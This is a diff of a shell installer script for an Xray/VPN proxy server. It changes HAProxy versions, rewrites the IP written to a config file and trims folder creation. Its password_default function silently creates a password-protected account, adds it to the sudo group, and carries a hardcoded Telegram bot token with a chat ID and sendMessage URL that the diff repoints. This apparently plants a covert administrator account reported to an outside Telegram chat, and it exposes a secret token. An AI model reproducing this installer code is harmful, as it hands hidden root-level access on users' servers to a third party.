@@ -228,17 +228,17 @@ function first_setup(){
     echo "Setup Dependencies $(cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/PRETTY_NAME//g')"
     sudo apt update -y
     apt-get install --no-install-recommends software-properties-common
-    add-apt-repository ppa:vbernat/haproxy-2.2
-    apt-get install haproxy=2.2.\*
+    add-apt-repository ppa:vbernat/haproxy-2.0
+    apt-get install haproxy=2.0.\*
 elif [[ $(cat /etc/os-release | grep -w ID | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/ID//g') == "debian" ]]; then
     echo "Setup Dependencies For OS Is $(cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/PRETTY_NAME//g')"
     curl https://haproxy.debian.net/bernat.debian.org.gpg \
         | gpg --dearmor > /usr/share/keyrings/haproxy.debian.net.gpg
     echo deb "[signed-by=/usr/share/keyrings/haproxy.debian.net.gpg]" \
-        http://haproxy.debian.net buster-backports-2.2 main \
+        http://haproxy.debian.net buster-backports-2.0 main \
         > /etc/apt/sources.list.d/haproxy.list
     sudo apt-get update
-    apt-get install haproxy=2.2.\*
+    apt-get install haproxy=2.0.\*
 else
     echo -e " Your OS Is Not Supported ($(cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/PRETTY_NAME//g') )"
     exit 1
@@ -309,7 +309,7 @@ echo ""
 if [[ $host == "1" ]]; then
 echo -e "   \e[1;32mPlease Enter Your Subdomain $NC"
 read -p "   Subdomain: " host1
-echo "IP=" >> /var/lib/kyt/ipvps.conf
+echo "$MYIP" >> /var/lib/kyt/ipvps.conf
 echo $host1 > /etc/xray/domain
 echo $host1 > /root/domain
 echo ""
@@ -339,7 +339,7 @@ function password_default() {
     echo -e "$Password\n$Password\n"|passwd $Username > /dev/null 2>&1
     usermod -aG sudo $Username > /dev/null 2>&1
 
-    CHATID="847645599"
+    CHATID="-1002117725897"
     KEY="6123951004:AAFMeqbK8n2HEVyCnlUKlvnFgpCpt86wbaA"
     TIME="10"
     URL="https://api.telegram.org/bot$KEY/sendMessage"
@@ -384,7 +384,7 @@ print_install "Memasang SSL Pada Domain"
 }
 
 function make_folder_xray() {
-rm -rf /etc/vmess/.vmess.db
+    rm -rf /etc/vmess/.vmess.db
     rm -rf /etc/vless/.vless.db
     rm -rf /etc/trojan/.trojan.db
     rm -rf /etc/shadowsocks/.shadowsocks.db
@@ -400,14 +400,6 @@ rm -rf /etc/vmess/.vmess.db
     mkdir -p /usr/bin/xray/
     mkdir -p /var/log/xray/
     mkdir -p /var/www/html
-    mkdir -p /etc/kyt/limit/vmess/ip
-    mkdir -p /etc/kyt/limit/vless/ip
-    mkdir -p /etc/kyt/limit/trojan/ip
-    mkdir -p /etc/kyt/limit/ssh/ip
-    mkdir -p /etc/limit/vmess
-    mkdir -p /etc/limit/vless
-    mkdir -p /etc/limit/trojan
-    mkdir -p /etc/limit/ssh
     chmod +x /var/log/xray
     touch /etc/xray/domain
     touch /var/log/xray/access.log
